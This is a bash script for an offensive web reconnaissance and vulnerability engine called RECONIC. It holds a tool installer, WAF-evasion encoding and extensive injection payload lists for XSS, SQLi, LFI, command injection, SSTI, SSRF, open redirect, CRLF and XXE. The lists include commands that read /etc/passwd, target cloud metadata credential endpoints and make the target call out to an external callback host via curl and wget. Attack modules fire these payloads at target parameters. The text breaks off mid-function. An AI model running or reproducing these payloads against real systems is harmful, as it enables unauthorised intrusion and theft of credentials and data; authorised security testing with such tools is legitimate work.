#!/usr/bin/env bash
# ═══════════════════════════════════════════════════════════════════
#  R E C O N I C   v 8.1
#  Reconnaissance & Vulnerability Engine
#  map · fingerprint · detect · confirm
#  by Inayat Hussain
#  Red Team Operator · Penetration Tester · Offensive Security Engineer
# ═══════════════════════════════════════════════════════════════════
set -uo pipefail
IFS=$'\n\t'

VERSION="8.1.0"; SELF="$(readlink -f "$0")"
AUTHOR="Inayat Hussain"
ROLE="Red Team Operator · Penetration Tester · Offensive Security Engineer"
SUB="Reconnaissance & Vulnerability Engine"
TAG="map · fingerprint · detect · confirm"

# UTF-8 locale so box/block glyphs survive
if locale -a 2>/dev/null | grep -qiE '^(C\.UTF-8|en_US\.UTF-8)$'; then
  export LC_ALL="$(locale -a 2>/dev/null | grep -iE '^(C\.UTF-8|en_US\.UTF-8)$' | head -1)"
fi

[[ -t 1 ]] && { R=$'\e[0m';B=$'\e[1m';D=$'\e[2m';G=$'\e[38;5;48m';Y=$'\e[38;5;220m'
  E=$'\e[38;5;203m';C=$'\e[38;5;51m';M=$'\e[38;5;177m';O=$'\e[38;5;208m'; } \
  || { R=;B=;D=;G=;Y=;E=;C=;M=;O=; }

OUT=""; LOGDIR=""; SILENT=0; JSONL=0; RESUME=0; DEBUG=0
PROFILE="normal"; CONC=40; RATE=90; MAXURLS=250000; MINSEV=low
DO_NUCLEI=1; DO_CRAWL=1; DO_DIR=0; DO_FUZZ=0; DO_VHOST=0; DO_SUBBRUTE=0
CONFIRM=1; PASSIVE=0; EVADE=1; OOB=1; OOB_TIMEOUT=25; OOB_DOMAIN=""; OOB_PID=""
MODULES=""; SKIP=""; TARGETS=(); CMD="scan"; WORDLIST=""; DIFF_BASE=""
SCOPE=""; EXCLUDE=""; PH=0; PH_TOTAL=11; WORK=""

log()  { printf '[%s] %s\n' "$(date +%T)" "$*" >>"${STEPLOG:-/dev/null}"; }
info() { ((SILENT))||printf '%s│%s %s\n' "$C" "$R" "$*"; }
ok()   { ((SILENT))||printf '%s✔%s %s\n' "$G" "$R" "$*"; }
warn() { ((SILENT))||printf '%s▲%s %s\n' "$Y" "$R" "$*"; log "WARN $*"; }
err()  { printf '%s✘%s %s\n' "$E" "$R" "$*" >&2; }
die()  { err "$*"; exit 1; }
rule() { printf '%s%s%s\n' "$M" "$(printf '─%.0s' {1..62})" "$R"; }
# multibyte-safe repeat
rep()  { local n=$1 c=$2 i s=""; for ((i=0;i<n;i++)); do s+="$c"; done; printf '%s' "$s"; }
bar()  { local p=$1 w=24 f=$((p*w/100)); printf '%s[%s%s]%s %3d%%' "$D" "$(rep "$f" '█')" "$(rep $((w-f)) '░')" "$R" "$p"; }

banner() {
  ((SILENT)) && return
  rule
  printf '%s' "$M"
  cat <<'ART'
   ██████╗ ███████╗ ██████╗ ██████╗ ███╗   ██╗██╗ ██████╗
   ██╔══██╗██╔════╝██╔════╝██╔═══██╗████╗  ██║██║██╔════╝
   ██████╔╝█████╗  ██║     ██║   ██║██╔██╗ ██║██║██║
   ██╔══██╗██╔══╝  ██║     ██║   ██║██║╚██╗██║██║██║
   ██║  ██║███████╗╚██████╗╚██████╔╝██║ ╚████║██║╚██████╗
   ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝ ╚═════╝
ART
  printf '%s\n' "$R"
  printf '   %s\n' "$SUB"
  printf '   %s%s%s\n' "$D" "$TAG" "$R"
  printf '   %sby %s%s\n' "$D" "$AUTHOR$R"
  printf '   %s%s%s\n' "$D" "$ROLE" "$R"
  local st="${E}● offline$R"; [[ -n "$OOB_DOMAIN" ]] && st="${G}● listening$R"
  printf '   %sv%s%s %*soob: %s\n' "$D" "$VERSION" "$R" 34 "" "$st"
  rule; printf '\n'
}

usage() {
  banner
  cat <<EOF
${B}USAGE${R}  $(basename "$0") [command] [options]

${B}COMMANDS${R}  scan ${D}(default)${R} · diff · install · verify · update · version

${B}TARGETS${R}
  -d <domain>        single target
  -t <file>          target list        ${D}(-l alias)${R}
  -                   read stdin

${B}WORDLISTS${R}
  -w <file>          dir / vhost / sub-brute wordlist
  ${D}(default: ~/.reconic/wordlists/dir.txt)${R}

${B}OPTIONS${R}
  -o <dir>           output root ${D}(./reconic-out)${R}
  -p <profile>       light|normal|deep
  -c <n>             concurrency ${D}(40)${R}      -r <n>  req/s ${D}(90)${R}
  --evade <0-3>      WAF evasion level
  --modules a,b      only these        --skip a,b   exclude these
  --sev <level>      report floor: low|medium|high|critical
  --vhost            Host-header vhost fuzzing
  --subs-brute       subdomain brute force
  --dir              directory bruteforce
  --fuzz             parameter fuzzing
  --diff <dir>       diff current run against previous run
  --scope <regex>    keep only matching hosts
  --exclude <regex>  drop matching hosts
  --no-oob  --no-confirm  --no-crawl  --no-nuclei
  --max-urls <n>     --passive  --resume  --jsonl  --debug  -q  -s

${B}MODULES${R}
  ${D}param${R}  xss sqli lfi rce ssti ssrf redirect crlf idor jwt xxe fuzz
  ${D}host${R}   exposure cors hosthdr takeover tls dir vhost

${B}EXAMPLES${R}
  $(basename "$0") -d example.com --vhost --dir -w ~/wl/raft.txt
  $(basename "$0") -t scopes.txt -c 60 --subs-brute --evade 2
  $(basename "$0") diff ./reconic-out/old ./reconic-out/new
EOF
}

ALL_PARAM="xss sqli lfi rce ssti ssrf redirect crlf idor jwt xxe"
ALL_HOST="exposure cors hosthdr takeover tls"

parse() {
  [[ $# -eq 0 ]] && { usage; exit 0; }
  case "${1:-}" in
    install|update|verify|version|help|diff|-h|--help)
      CMD="$1"; [[ "$CMD" == -h || "$CMD" == --help ]] && CMD="help"
      [[ "$CMD" == install && "${2:-}" == --verify ]] && CMD="verify"
      if [[ "$CMD" == diff ]]; then OLD="${2:-}"; NEW="${3:-}"; fi
      return 0 ;;
  esac
  while [[ $# -gt 0 ]]; do
    case "$1" in
      -d) TARGETS+=("$2"); shift 2 ;;
      -t|-l) mapfile -t -O "${#TARGETS[@]}" TARGETS <"$2"; shift 2 ;;
      -w) WORDLIST="$2"; shift 2 ;;
      -o) OUT="$2"; shift 2 ;;  -p) PROFILE="$2"; shift 2 ;;
      -c|--threads) CONC="$2"; shift 2 ;;  -r) RATE="$2"; shift 2 ;;
      --evade) EVADE="$2"; shift 2 ;;
      --modules) MODULES="${2//,/ }"; shift 2 ;;
      --skip) SKIP="${2//,/ }"; shift 2 ;;
      --sev) MINSEV="$2"; shift 2 ;;
      --max-urls) MAXURLS="$2"; shift 2 ;;
      --oob-timeout) OOB_TIMEOUT="$2"; shift 2 ;;
      --diff) DIFF_BASE="$2"; shift 2 ;;
      --scope) SCOPE="$2"; shift 2 ;;
      --exclude) EXCLUDE="$2"; shift 2 ;;
      --vhost) DO_VHOST=1; shift ;;
      --subs-brute) DO_SUBBRUTE=1; shift ;;
      --dir) DO_DIR=1; shift ;;  --fuzz) DO_FUZZ=1; shift ;;
      --no-oob) OOB=0; shift ;;  --no-confirm) CONFIRM=0; shift ;;
      --passive) PASSIVE=1; DO_CRAWL=0; shift ;;
      --no-crawl) DO_CRAWL=0; shift ;;  --no-nuclei) DO_NUCLEI=0; shift ;;
      --resume) RESUME=1; shift ;;      --jsonl) JSONL=1; shift ;;
      --debug) DEBUG=1; shift ;;
      -q) shift ;;  -s) SILENT=1; shift ;;
      -) mapfile -t -O "${#TARGETS[@]}" TARGETS; shift ;;
      *) die "unknown: $1" ;;
    esac
  done
  [[ "$PROFILE" == light ]] && { CONC=${CONC:-8}; RATE=${RATE:-20}; DO_CRAWL=0; DO_DIR=0; }
  [[ "$PROFILE" == deep  ]] && { CONC=${CONC:-70}; RATE=${RATE:-140}; DO_DIR=1; DO_FUZZ=1; DO_VHOST=1; }
}

# ── deps ────────────────────────────────────────────────────────────────
declare -A GOT=(
  [subfinder]="github.com/projectdiscovery/subfinder/v2/cmd/subfinder"
  [assetfinder]="github.com/tomnomnom/assetfinder"
  [httpx]="github.com/projectdiscovery/httpx/cmd/httpx"
  [dnsx]="github.com/projectdiscovery/dnsx/cmd/dnsx"
  [tlsx]="github.com/projectdiscovery/tlsx/cmd/tlsx"
  [katana]="github.com/projectdiscovery/katana/cmd/katana"
  [gau]="github.com/lc/gau/v2/cmd/gau"
  [waybackurls]="github.com/tomnomnom/waybackurls"
  [nuclei]="github.com/projectdiscovery/nuclei/v3/cmd/nuclei"
  [ffuf]="github.com/ffuf/ffuf/v2"
  [interactsh-client]="github.com/projectdiscovery/interactsh/cmd/interactsh-client"
)
SUDO=""; [[ $EUID -ne 0 ]] && SUDO="sudo"
gopath() { local b; b="$(go env GOBIN 2>/dev/null)"; [[ -z "$b" ]] && b="$(go env GOPATH 2>/dev/null)/bin"
  [[ "$b" == /bin ]] && b="$HOME/go/bin"; mkdir -p "$b"; export PATH="$b:$PATH"; }
have() { command -v "$1" >/dev/null 2>&1; }
inst1() { local b="$1" m="$2"; have "$b" && { ok "$b"; return 0; }
  have go || { warn "$b skipped"; return 1; }; gopath
  go install "$m@latest" >/dev/null 2>&1 && ok "$b installed" || warn "$b failed"; }

do_install() {
  banner; info "installing"; rule
  local pm=""; for c in apt-get dnf pacman apk brew; do have "$c" && { pm="$c"; break; }; done
  case "$pm" in
    apt-get) $SUDO apt-get update -qq && $SUDO apt-get install -y -qq jq git curl wget unzip python3 dnsutils whois >/dev/null 2>&1 ;;
    dnf) $SUDO dnf install -y -q jq git curl wget unzip python3 bind-utils whois >/dev/null 2>&1 ;;
    pacman) $SUDO pacman -Sy --noconfirm --needed jq git curl wget unzip python dnsutils whois >/dev/null 2>&1 ;;
    apk) $SUDO apk add --no-cache jq git curl wget unzip python3 bind-tools whois >/dev/null 2>&1 ;;
    brew) brew install jq git curl wget python3 >/dev/null 2>&1 ;;
    *) warn "no package manager" ;;
  esac
  have go || { [[ "$pm" == apt-get ]] && $SUDO apt-get install -y golang-go >/dev/null 2>&1; }
  for t in "${!GOT[@]}"; do inst1 "$t" "${GOT[$t]}"; done
  local w="$HOME/.reconic/wordlists"; mkdir -p "$w"
  [[ -s "$w/dns.txt" ]] || curl -fsSL "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/DNS/subdomains-top1million-20000.txt" -o "$w/dns.txt" 2>/dev/null
  [[ -s "$w/dir.txt" ]] || curl -fsSL "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/raft-medium-files.txt" -o "$w/dir.txt" 2>/dev/null
  [[ -s "$w/vhost.txt" ]] || curl -fsSL "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/DNS/subdomains-top1million-5000.txt" -o "$w/vhost.txt" 2>/dev/null
  [[ -s "$w/pass.txt" ]] || curl -fsSL "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt" -o "$w/pass.txt" 2>/dev/null
  ok "wordlists"
  have nuclei && nuclei -update-templates -silent >/dev/null 2>&1 && ok "templates"
  rule; ok "done"; rule
  warn "re-run your scan now"
}
do_verify() { banner; local m=0
  for t in "${!GOT[@]}"; do have "$t" && printf '  %s✔%s %s\n' "$G" "$R" "$t" || { printf '  %s✘%s %s\n' "$E" "$R" "$t"; ((m++)); }; done
  ((m)) && warn "$m missing" || ok "intact"; }

# ── http core ───────────────────────────────────────────────────────────
UAS=('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0 Safari/537.36'
     'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/123.0 Safari/537.36'
     'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15')
ua() { printf '%s' "${UAS[RANDOM % ${#UAS[@]}]}"; }
THROTTLE=0.4
throttle() { sleep "$THROTTLE"; }

req() { local u="$1"; shift; throttle
  CODE=$(curl -sS -m 14 -k --compressed -A "$(ua)" -D "$HDR" -o "$BODY" -w '%{http_code}' "$@" "$u" 2>/dev/null) || CODE=000
  CT=$(grep -i '^content-type:' "$HDR" 2>/dev/null | tr -d '\r' | cut -d: -f2- | tr -d ' ')
  printf '%s' "$CODE"; }

mutate() { local u="$1" p="$2" pl="$3" base q out="" kv k
  u="${u%%#*}"; [[ "$u" == *\?* ]] || return 1
  base="${u%%\?*}"; q="${u#*\?}"; local IFS='&'
  for kv in $q; do k="${kv%%=*}"
    [[ "$k" == "$p" ]] && out+="$k=$pl&" || out+="$kv&"; done
  printf '%s?%s' "$base" "${out%&}"; }

params_of() { local u="${1%%#*}"; [[ "$u" == *\?* ]] || return 0
  local IFS='&' kv; for kv in ${u#*\?}; do printf '%s\n' "${kv%%=*}"; done | sed '/^$/d' | head -n 10; }

fnd() { local s="$1" c="$2" t="$3" u="$4" p="$5" e="$6"
  e="${e//$'\t'/ }"; e="${e//$'\n'/ }"; e="${e:0:190}"
  printf '%s\t%s\t%s\t%s\t%s\t%s\n' "$s" "$c" "$t" "$u" "${p:--}" "$e" >>"$FIND"
  log "FIND $s $c $t $u $p"; }

HDR=""; BODY=""; CT=""
cleanup() { [[ -n "$WORK" ]] && rm -rf "$WORK"; }
setup() { WORK="$(mktemp -d)"; HDR="$WORK/h"; BODY="$WORK/b"; BASE="$WORK/bb"; trap cleanup EXIT; }
baseline() { [[ -f "$BASE" ]] && return 0
  CODE=$(curl -sS -m 14 -k --compressed -A "$(ua)" -o "$BASE" -w '%{http_code}' "$1" 2>/dev/null) || CODE=000
  wc -c <"$BASE" | tr -d ' ' >"$WORK/bl"; echo "$CODE" >"$WORK/bc"; }
blen() { cat "$WORK/bl" 2>/dev/null || echo 0; }
htmlctx() { grep -qi 'text/html' <<<"${CT:-}"; }

enc() { local l="$1" p="$2"
  python3 - "$l" "$p" <<'PY'
import sys,urllib.parse
l,p=int(sys.argv[1]),sys.argv[2]
o=urllib.parse.quote(p,safe="")
if l>=2: o=urllib.parse.quote(o,safe="")
if l>=3: o=o.replace("%","%%")
sys.stdout.write(o)
PY
}

# ── payloads ────────────────────────────────────────────────────────────
P_XSS=( '<script>alert(1)</script>' '<script>alert(document.domain)</script>'
 '"><script>alert(1)</script>' "'><script>alert(1)</script>" '<script src=//TOKEN.OAST></script>'
 '"><script src=//TOKEN.OAST></script>' '<img src=x onerror=alert(1)>'
 '<img src=x onerror=alert`1`>' '<img/src=x/onerror=alert(1)>' '<img src="x"onerror="alert(1)">'
 '<IMG SRC=x ONERROR=alert(1)>' '<svg/onload=alert(1)>' '<svg onload=alert(1)>'
 '<svg	onload=alert(1)>' '<svg%0aonload=alert(1)>' '<svg><script>alert(1)</script>'
 '<svg><animate onbegin=alert(1) attributeName=x dur=1s>' '<body onload=alert(1)>'
 '<input autofocus onfocus=alert(1)>' '<details open ontoggle=alert(1)>' '<marquee onstart=alert(1)>'
 '<video><source onerror=alert(1)>' '<audio src=x onerror=alert(1)>'
 '<iframe srcdoc="<script>alert(1)</script>">' '<a href=javascript:alert(1)>x</a>'
 '<math><mtext><script>alert(1)</script>' '<ScRiPt>alert(1)</sCrIpT>' '<script>alert(1)//</script>'
 '<script/*x*/>alert(1)</script>' '<img src=x onerror=eval(atob("YWxlcnQoMSk="))>'
 '<img src=x onerror=alert?.(1)>' '<template><script>alert(1)</script></template>'
 '<noscript><p title="</noscript><img src=x onerror=alert(1)>">' '<image src=x onerror=alert(1)>'
 '<isindex action=javascript:alert(1) type=image>' '<form><button formaction=javascript:alert(1)>x'
 '<object data=javascript:alert(1)>' '<embed src=javascript:alert(1)>'
 '--><script>alert(1)</script>' '</title><script>alert(1)</script>' 'javascript:alert(1)'
 '"><img src=x onerror=alert(1)>' "'><img src=x onerror=alert(1)>"
 '<svg><style>@import"//TOKEN.OAST"</style>' '<img src=x onerror=import("//TOKEN.OAST")>'
 '<x onmouseover=alert(1)>x</x>' )

P_SQLI=( "'" "''" '"' "')" "'))" "'--" "'#" "'/*" "1'" '1"'
 "' OR '1'='1" "' OR '1'='1'--" "' OR '1'='1'#" "' OR 1=1--" "' OR 1=1#"
 '" OR "1"="1' '" OR "1"="1"--' "' OR 'x'='x" "') OR ('1'='1" "' OR 1=1 LIMIT 1--"
 "1 OR 1=1" "1 AND 1=1" "1 AND 1=2" "' AND '1'='1" "' AND '1'='2" "1' AND '1'='1" "1' AND '1'='2"
 "1 AND SLEEP(3)" "1' AND SLEEP(3)--" '1" AND SLEEP(3)--' "1');SELECT SLEEP(3)--" "1) AND SLEEP(3)--"
 "1 AND (SELECT 1 FROM (SELECT SLEEP(3))x)" "1' AND (SELECT 1 FROM (SELECT SLEEP(3))x)--"
 "1' ORDER BY 1--" "1' ORDER BY 10--" "1' ORDER BY 100--" "1 UNION SELECT NULL--"
 "1 UNION SELECT NULL,NULL--" "1 UNION SELECT NULL,NULL,NULL--" "' UNION SELECT NULL--"
 "' UNION SELECT NULL,NULL--" "-1 UNION SELECT 1--" "-1 UNION SELECT 1,2--" "-1 UNION SELECT 1,2,3--"
 "'/**/OR/**/'1'='1" "'%09OR%091=1--" "/*!50000OR*/1=1--" "1'/*!AND*/'1'='1" "'%0bOR%0b'1'='1"
 "' AND extractvalue(1,concat(0x7e,version()))--" "' AND updatexml(1,concat(0x7e,user()),1)--"
 "' AND 1=CONVERT(int,(SELECT @@version))--" "%27%20OR%20%271%27%3D%271" "' OR SLEEP(3)--" )

P_LFI=( '../../../etc/passwd' '../../../../etc/passwd' '../../../../../etc/passwd'
 '../../../../../../etc/passwd' '../../../../../../../etc/passwd' '../../../../../../../../etc/passwd'
 '../../../../../../../../../../etc/passwd' '../../../../../../../../../../../../etc/passwd'
 '..%2f..%2f..%2f..%2fetc%2fpasswd' '..%252f..%252f..%252f..%252fetc%252fpasswd'
 '....//....//....//....//etc/passwd' '....\/....\/....\/etc/passwd' '....//....//....//etc//passwd'
 '/etc/passwd' '/etc/passwd%00' '/etc/passwd%00.jpg' '/etc/passwd%2500' '%2fetc%2fpasswd'
 'php://filter/convert.base64-encode/resource=index' 'php://filter/convert.base64-encode/resource=index.php'
 'php://filter/convert.base64-encode/resource=../config.php' 'php://filter/convert.base64-encode/resource=../wp-config.php'
 'php://filter/convert.base64-encode/resource=../.env' 'php://filter/convert.base64-encode/resource=/etc/passwd'
 'php://filter/convert.base64-encode/resource=../../../../etc/passwd'
 'php://filter/zlib.deflate/convert.base64-encode/resource=index.php'
 'php://filter/convert.iconv.utf-8.utf-16/resource=index.php' 'data://text/plain,<?php phpinfo();?>'
 'data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+' 'expect://id' 'file:///etc/passwd'
 '/var/www/html/index.php' '/var/log/apache2/access.log' '/proc/self/environ' '/proc/self/cmdline'
 '/proc/version' '/etc/hostname' '/etc/hosts' '/etc/issue' '/etc/mysql/my.cnf' '/etc/nginx/nginx.conf'
 'C:/boot.ini' '..\..\..\..\windows\win.ini' '%5c..%5c..%5c..%5cwindows%5cwin.ini'
 '.%2e/.%2e/.%2e/.%2e/etc/passwd' '..%c0%af..%c0%af..%c0%afetc/passwd' '..;/..;/..;/etc/passwd'
 '/././././././etc/passwd' './../../../../etc/passwd' )

P_RCE=( ';id' '|id' '||id' '&&id' '&id' '%0aid' '%0did' '`id`' '$(id)' "';id;'" '";id;"'
 '| whoami' '; whoami' '|| whoami' '&& whoami' '& whoami' '%0awhoami' '`whoami`' '$(whoami)'
 '$(cat /etc/passwd)' '|cat /etc/passwd' ';cat /etc/passwd' '1;id' '1|id' '1||id' '1&&id' '1%0aid'
 '1`id`' '1$(id)' ';uname -a' '|uname -a' '$(uname -a)' ';echo rcn$((7*7))' '|echo rcn$((7*7))'
 ';sleep 3' '|sleep 3' '$(sleep 3)' '`sleep 3`' ';curl TOKEN.OAST' '|curl TOKEN.OAST'
 '$(curl TOKEN.OAST)' ';ping -c1 TOKEN.OAST' '|ping -c1 TOKEN.OAST' ';nslookup TOKEN.OAST'
 '& nslookup TOKEN.OAST &' '|wget -qO- TOKEN.OAST' ';wget -qO- TOKEN.OAST' )

P_SSTI=( '{{7*7}}' '{{7*"7"}}' "{{'7'*'7'}}" '${{7*7}}' '${7*7}' '#{7*7}' '<%=7*7%>'
 '{{7*7}}${7*7}' '@(7*7)' '{7*7}' '{{= 7*7}}' '{{7 * 7}}' '{{7  *  7}}' '#set($x=7*7)$x'
 '${"freemarker.template.utility.Execute"?new()("id")}'
 '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}'
 '{{cycler.__init__.__globals__.os.popen("id").read()}}'
 '{{lipsum.__globals__["os"].popen("id").read()}}'
 "{{''.__class__.__mro__[1].__subclasses__()}}"
 '{{config}}' '{{self}}' '{{request}}' '{{7*7}}//' '{{7*7}}"' "{{7*7}}'" )

P_SSRF=( 'http://127.0.0.1' 'http://127.0.0.1:80' 'http://127.0.0.1:8080' 'http://127.0.0.1:22'
 'http://localhost' 'http://localhost:80' 'http://localhost:8080' 'http://[::1]' 'http://0.0.0.0'
 'http://0' 'http://127.1' 'http://2130706433' 'http://0x7f000001' 'http://0177.0.0.1'
 'http://169.254.169.254' 'http://169.254.169.254/latest/meta-data/'
 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'
 'http://169.254.169.254/latest/user-data' 'http://metadata.google.internal/computeMetadata/v1/'
 'http://100.100.100.200/latest/meta-data/' 'http://169.254.169.254/metadata/v1/'
 'http://192.0.0.192/latest/meta-data/' 'file:///etc/passwd' 'file:///etc/hostname'
 'gopher://127.0.0.1:6379/_INFO' 'dict://127.0.0.1:6379/info' 'http://127.0.0.1/server-status'
 'http://127.0.0.1:9200/' 'http://127.0.0.1:6379/' 'http://127.0.0.1:11211/'
 'http://127.0.0.1:2375/version' 'http://127.0.0.1:8500/v1/status/leader'
 'http://127.0.0.1:8080/actuator/env' 'http://localhost/admin'
 'http://TOKEN.OAST/' 'https://TOKEN.OAST/' 'TOKEN.OAST' '//TOKEN.OAST' )

P_REDIR=( '//evil.com' '///evil.com' '////evil.com' 'https://evil.com' 'http://evil.com'
 '//evil.com/%2f..' '/\evil.com' '\/evil.com' '//google.com' 'https://google.com'
 '//evil.com@google.com' '//google.com@evil.com' 'http://evil.com#google.com'
 '//evil.com?.google.com' 'https:evil.com' '//%09/evil.com' '//evil.com:80' 'http:/evil.com'
 'https:/evil.com' '//evil.com/../google.com' '/%09/evil.com' )

P_CRLF=( '%0d%0aReconic:1' '%0aReconic:1' '%0d%0aSet-Cookie:rcn=1' '%23%0d%0aReconic:1'
 '%3f%0d%0aReconic:1' '%0d%0a%20Reconic:1' )

P_XXE=( '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY e SYSTEM "file:///etc/passwd">]><r>&e;</r>'
 '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY e SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><r>&e;</r>'
 '<!DOCTYPE r [<!ENTITY % p SYSTEM "http://TOKEN.OAST/"> %p;]><r>x</r>' )

SQL_ERR='SQL syntax|mysql_fetch|MySqlException|ORA-[0-9]{5}|PostgreSQL.*ERROR|SQLite.*error|Unclosed quotation|Microsoft OLE DB|SQLSTATE|SequelizeDatabaseError|pg_query|syntax error at or near|You have an error in your SQL'
LFI_SIG='root:.*:0:0:|PD9waHA|\[fonts\]|daemon:.*:1:1:'
RCE_SIG='uid=[0-9]+.*gid=[0-9]+|^Linux |Microsoft Windows \[Version'
SSRF_SIG='ami-id|instance-id|root:.*:0:0:|SSH-2\.0|redis_version|__meta'

# ── OOB ─────────────────────────────────────────────────────────────────
oob_start() {
  ((OOB)) || return 0
  have interactsh-client || { warn "interactsh-client missing — OOB off (run: $0 install)"; OOB=0; return 0; }
  OOB_JSON="$OUT/_oob.jsonl"; OOB_SF="$OUT/_oob.server"; OOB_MAP="$OUT/_oob.map"
  : >"$OOB_JSON"; : >"$OOB_MAP"; rm -f "$OOB_SF"
  interactsh-client -json -o "$OOB_JSON" -sf "$OOB_SF" -silent >/dev/null 2>&1 &
  OOB_PID=$!
  local i; for i in $(seq 1 30); do [[ -s "$OOB_SF" ]] && break; sleep 1; done
  if [[ -s "$OOB_SF" ]]; then OOB_DOMAIN="$(head -1 "$OOB_SF" | tr -d '[:space:]')"
  else warn "oob registration failed"; OOB=0; kill "$OOB_PID" 2>/dev/null; OOB_PID=""; fi
}
oob_stop() { [[ -n "$OOB_PID" ]] && kill "$OOB_PID" 2>/dev/null; wait "$OOB_PID" 2>/dev/null; OOB_PID=""; }
oob_tok() { printf 'r%s' "$(head -c4 /dev/urandom | od -An -tx1 | tr -d ' \n')"; }
oob_map() { printf '%s\t%s\t%s\t%s\n' "$1" "$2" "$3" "$4" >>"$OOB_MAP"; }
oob_poll() {
  [[ -z "$OOB_DOMAIN" || ! -s "$OOB_JSON" ]] && return 0
  local tok mod url par
  while IFS=$'\t' read -r tok mod url par; do
    [[ -z "$tok" ]] && continue
    grep -qF "$tok" "$OOB_JSON" 2>/dev/null || continue
    local pr; pr=$(grep -F "$tok" "$OOB_JSON" 2>/dev/null | head -1 | jq -r '.protocol // "dns"' 2>/dev/null)
    local sev=high; [[ "$mod" == xxe ]] && sev=critical
    fnd "$sev" firm "oob-$mod" "$url" "$par" "$pr callback (token $tok)"
  done <"$OOB_MAP"
}

# ── param modules ───────────────────────────────────────────────────────
m_xss() { local u="$1" p; baseline "$u"; htmlctx || return 0
  local can="r8c${RANDOM}" mark="<u>${can}</u>" tok
  for p in $(params_of "$u"); do
    local m; m=$(mutate "$u" "$p" "$(enc "$EVADE" "$mark")") || continue
    req "$m" >/dev/null
    if grep -qF "$mark" "$BODY" 2>/dev/null && ! grep -qF "$mark" "$BASE" 2>/dev/null; then
      ((CONFIRM)) && { req "$m" >/dev/null; grep -qF "$mark" "$BODY" 2>/dev/null || continue; }
      fnd high firm xss "$u" "$p" "unescaped HTML reflection"; continue; fi
    local pl; for pl in '<svg/onload=alert(1)>' '"><svg/onload=alert(1)>' '<img src=x onerror=alert(1)>'; do
      m=$(mutate "$u" "$p" "$(enc "$EVADE" "$pl")") || continue
      req "$m" >/dev/null
      grep -qiE '&lt;svg|<svg|&lt;img|<img' "$BODY" 2>/dev/null && { fnd medium probable xss "$u" "$p" "reflected ${pl:0:24}"; break; }
    done
    [[ -n "$OOB_DOMAIN" ]] && { tok=$(oob_tok); oob_map "$tok" xss "$u" "$p"
      m=$(mutate "$u" "$p" "$(enc "$EVADE" "><script src=//${tok}.${OOB_DOMAIN}></script>")") && req "$m" >/dev/null; }
  done; }

m_sqli() { local u="$1" p; baseline "$u"
  for p in $(params_of "$u"); do
    local m; m=$(mutate "$u" "$p" "'") || continue; req "$m" >/dev/null
    if grep -qiE "$SQL_ERR" "$BODY" 2>/dev/null && ! grep -qiE "$SQL_ERR" "$BASE" 2>/dev/null; then
      fnd high firm sqli "$u" "$p" "DB error: $(grep -oiE "$SQL_ERR" "$BODY" | head -1)"; continue; fi
    local t1 t2; t1=$(mutate "$u" "$p" "$(enc "$EVADE" "1' AND '1'='1")") || continue
    t2=$(mutate "$u" "$p" "$(enc "$EVADE" "1' AND '1'='2")") || continue
    req "$t1" >/dev/null; local l1; l1=$(wc -c <"$BODY")
    req "$t2" >/dev/null; local l2; l2=$(wc -c <"$BODY")
    local d=$(( l1>l2 ? l1-l2 : l2-l1 ))
    (( l1>150 && d > l1/4 )) && fnd medium probable sqli "$u" "$p" "boolean ${l1}B/${l2}B"
    local s; s=$(mutate "$u" "$p" "1%20AND%20SLEEP(3)") || continue
    local t0=$SECONDS; req "$s" >/dev/null; local e1=$((SECONDS-t0))
    if (( e1 >= 2 )); then req "$s" >/dev/null; (( SECONDS-t0-e1 >= 2 )) && fnd high firm sqli "$u" "$p" "time-based ${e1}s+"; fi
  done; }

m_lfi() { local u="$1" p
  for p in $(params_of "$u"); do for pl in "${P_LFI[@]}"; do
    local m; m=$(mutate "$u" "$p" "$(enc "$EVADE" "$pl")") || continue; req "$m" >/dev/null
    grep -qE "$LFI_SIG" "$BODY" 2>/dev/null && { fnd critical firm lfi "$u" "$p" "read ${pl:0:28}"; break; }
  done; done; }

m_rce() { local u="$1" p; baseline "$u"
  for p in $(params_of "$u"); do for pl in "${P_RCE[@]}"; do
    local m; m=$(mutate "$u" "$p" "$(enc "$EVADE" "$pl")") || continue; req "$m" >/dev/null
    grep -qE "$RCE_SIG" "$BODY" 2>/dev/null && ! grep -qE "$RCE_SIG" "$BASE" 2>/dev/null && {
      fnd critical firm rce "$u" "$p" "output ${pl:0:20}"; break; }
  done; done; }

m_ssti() { local u="$1" p; baseline "$u"
  for p in $(params_of "$u"); do for pl in "${P_SSTI[@]}"; do
    local m; m=$(mutate "$u" "$p" "$(enc "$EVADE" "$pl")") || continue; req "$m" >/dev/null
    if grep -qE '(^|[^0-9])49([^0-9]|$)' "$BODY" 2>/dev/null && ! grep -qE '(^|[^0-9])49([^0-9]|$)' "$BASE" 2>/dev/null; then
      fnd high firm ssti "$u" "$p" "arith ${pl:0:18}"; break; fi
    grep -qE 'uid=[0-9]+' "$BODY" 2>/dev/null && { fnd critical firm ssti "$u" "$p" "RCE via SSTI"; break; }
  done; done; }

m_ssrf() { local u="$1" p; baseline "$u"; local bl; bl=$(blen)
  for p in $(params_of "$u"); do for pl in "${P_SSRF[@]}"; do
    local real="$pl"
    [[ "$pl" == *TOKEN.OAST* ]] && { [[ -z "$OOB_DOMAIN" ]] && continue
      local tk; tk=$(oob_tok); oob_map "$tk" ssrf "$u" "$p"; real="${pl//TOKEN/$tk}"; }
    local m; m=$(mutate "$u" "$p" "$(enc "$EVADE" "$real")") || continue; req "$m" >/dev/null
    grep -qE "$SSRF_SIG" "$BODY" 2>/dev/null && { fnd high firm ssrf "$u" "$p" "internal ${pl:0:26}"; break; }
    local l; l=$(wc -c <"$BODY")
